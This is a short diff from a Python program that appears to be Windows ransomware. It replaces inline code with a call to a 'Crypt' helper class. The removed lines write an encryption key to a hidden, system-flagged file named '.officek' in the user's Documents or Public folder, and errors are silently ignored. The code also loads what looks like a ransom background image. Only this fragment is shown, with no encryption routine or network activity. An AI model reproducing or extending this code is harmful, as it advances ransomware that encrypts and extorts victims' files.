@@ -12,19 +12,7 @@ if s=='Windows':
 	documents = path.expanduser('~/Documents')
 	downloads = path.expanduser('~/Downloads')
 
-	try:
-		with open(documents+'/.officek','wb') as key:
-			key.write(k)
-		sys('cd '+documents)
-		sys('attrib +s +h '+documents+'/.officek')
-	except:
-		try:
-			with open('C:/Users/Public/.officek','wb') as key:
-				key.write(k)
-			sys('cd C:/Users/Public')
-			sys('attrib +s +h C:/Users/Public/.officek')
-		except:
-			pass
+	Crypt.check_w_key(documents)
 
 	try:
 		bg = Crypt.resource_path('bg.jpg')
